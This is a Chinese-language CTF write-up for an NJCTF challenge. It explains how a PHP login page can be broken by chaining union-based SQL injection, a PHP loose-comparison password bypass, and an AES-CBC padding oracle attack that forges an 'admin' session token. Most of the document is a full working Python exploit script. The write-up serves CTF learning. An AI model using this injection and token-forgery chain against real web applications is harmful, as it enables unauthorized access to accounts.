## 这是NJCTF的题目

### 题目思路分析

此题目是关于 padding oracle attack的:
Padding oracle attack 攻击的原理请看[这篇文章](http://www.freebuf.com/articles/database/151167.html)：

先看代码：

```php
$query = "SELECT username, encrypted_pass from users WHERE username='$username'";
    $res = $conn->query($query) or trigger_error($conn->error . "[$query]");
    if ($row = $res->fetch_assoc()) {
        $uname = $row['username'];
        $encrypted_pass = $row["encrypted_pass"];
    }
```
此处存在一个sql注入，用union类型的sql注入，所以 $uname 和 $encrypted_pass 可控
再看 login函数：

```php
function login($encrypted_pass, $pass)
{
    $encrypted_pass = base64_decode($encrypted_pass);
    $iv = substr($encrypted_pass, 0, 16);
    $cipher = substr($encrypted_pass, 16);
    $password = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);
    return $password == $pass;
}
```
此处存在一个 php 弱类型, 因为 $encrypted_pass 和 $pass 都可控,我们只需要让 $encrypted_pass解密失败，然后提交一个空密码就可以绕过。

要想获取flag，需要让 `$_SESSION['isadmin'] == true;`成立，
主要通过构造密文，利用下面的函数，让 `$u === 'admin'` 成立。
```php
function test_identity()
{
    if (!isset($_COOKIE["token"]))
        return array();
    if (isset($_SESSION['id'])) {
        $c = base64_decode($_SESSION['id']);
        if ($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_COOKIE["token"]))) {
            if ($u === 'admin') {
                $_SESSION['isadmin'] = true;
            } else $_SESSION['isadmin'] = false;
        } else {
            die("ERROR!");
        }
    }
}
```

思路是，先通过 padding oracle 攻击，计算出 `$defaultId`,然后就在知道一组加密结果,即：

```
$ID = openssl_encrypt($defaultId, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token)
```
所以：

```
$defaultId = openssl_decrypt($ID, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token)
```
设 $ID 进行 aes解密之后的中间值为 $midText
则 `$defaultId = $midText^$token`

所以伪造一个`token = $token ^ $defaultId ^ 'admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b'`
解密之后，就可以使得 $u = 'admin'



### 攻击代码如下：

```python
import requests
import base64
import time
# url='http://218.2.197.235:23737/'
url='http://127.0.0.1:9090/src/'
N=16
phpsession=""
ID=""
def inject1(password):
    param={'username':"' union select 'bendawangbendawangbendawang','{password}".format(password=password),'password':''}
    result=requests.post(url,data=param)
    #print result.content
    return result

def inject_token(token):
    header={"Cookie":"PHPSESSID="+phpsession+";token="+token+";ID="+ID}
    result=requests.post(url,headers=header)
    return result

def xor(a, b):
    return "".join([chr(ord(a[i])^ord(b[i%len(b)])) for i in xrange(len(a))])

def pad(string,N):
    l=len(string)
    if l!=N:
        return string+chr(N-l)*(N-l)

def padding_oracle(N,cipher):
    get=""
    for i in xrange(1,N+1):
        for j in xrange(0,256):
            padding=xor(get,chr(i)*(i-1))
            c=chr(0)*(16-i)+chr(j)+padding+cipher
            print c.encode('hex')
            result=inject1(base64.b64encode(chr(0)*16+c))
            if "ctfer" not in result.content:
                get=chr(j^i)+get
                # time.sleep(0.1)
                break
    return get

session=inject1("bendawang").headers['set-cookie'].split(',')
phpsession=session[0].split(";")[0][10:]
print phpsession
ID=session[1][4:].replace("%3D",'=').replace("%2F",'/').replace("%2B",'+').decode('base64')
token=session[2][6:].replace("%3D",'=').replace("%2F",'/').replace("%2B",'+').decode('base64')

middle=""
middle=padding_oracle(N,ID)
print "ID:"+ID.encode('base64')
print "token:"+token.encode('base64')
print "middle:"+middle.encode('base64')
print "\n"
if(len(middle)==16):
    plaintext=xor(middle,token)
    print plaintext
    print plaintext.encode('base64')
    des=pad('admin',N)
    tmp=""
    print des.encode("base64")
    for i in xrange(16):
        tmp+=chr(ord(token[i])^ord(plaintext[i])^ord(des[i])) 
    print tmp.encode('base64')

    result=inject_token(base64.b64encode(tmp))
    print result.content
    if "flag" in result.content :
        raw_input("success")
```

Reference:

[http://blog.csdn.net/qq_19876131/article/details/61918399](http://blog.csdn.net/qq_19876131/article/details/61918399)

